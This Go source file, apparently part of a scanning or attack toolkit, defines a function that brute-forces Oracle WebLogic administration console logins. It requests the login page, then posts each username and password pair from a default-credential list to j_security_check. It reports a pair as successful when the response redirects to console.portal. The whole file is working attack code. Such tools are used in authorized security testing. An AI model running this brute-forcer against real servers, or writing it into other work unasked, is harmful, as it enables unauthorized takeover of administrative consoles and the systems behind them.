package brute

import (
	"fmt"
	"strings"
)

func Weblogic_brute(url string) (username string, password string) {
	if req, err := httpRequset(url+"/console/login/LoginForm.jsp", "GET", ""); err == nil {
		if req.StatusCode == 200 {
			for uspa := range weblogicuserpass {
				if req2, err2 := httpRequsetredirect(url+"/console/j_security_check", "POST", fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password)); err2 == nil {
					if strings.Contains(req2.Request.URL.String(), "console.portal") {
						fmt.Printf("weblogic-brute-sucess|%s:%s--%s\n", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password, url+"/console/")
						return weblogicuserpass[uspa].username, weblogicuserpass[uspa].password
					}
				}
			}
			return "login_page", ""
		}
	}
	return "", ""
}
